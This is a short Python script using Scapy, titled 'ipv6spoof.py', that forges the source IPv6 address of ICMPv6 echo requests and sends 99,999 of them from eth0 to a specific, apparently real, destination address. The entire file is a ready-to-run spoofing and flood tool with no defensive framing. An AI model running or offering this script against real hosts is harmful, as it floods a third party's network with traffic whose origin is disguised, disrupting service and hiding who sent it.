#!/usr/bin/python
#Author : Antonio Taboada
#Date: 10/10/2017
#Filename: ipv6spoof.py
#Purpose : Simple IPv6 spoof origen IP ;
import sys
from scapy.all import *

ipv6 = IPv6(src="2001::1", dst="2a02:9140:3c00:9200:20a7:3f07:d4a4:4096")/ICMPv6EchoRequest()
send(ipv6,iface="eth0", count=99999)
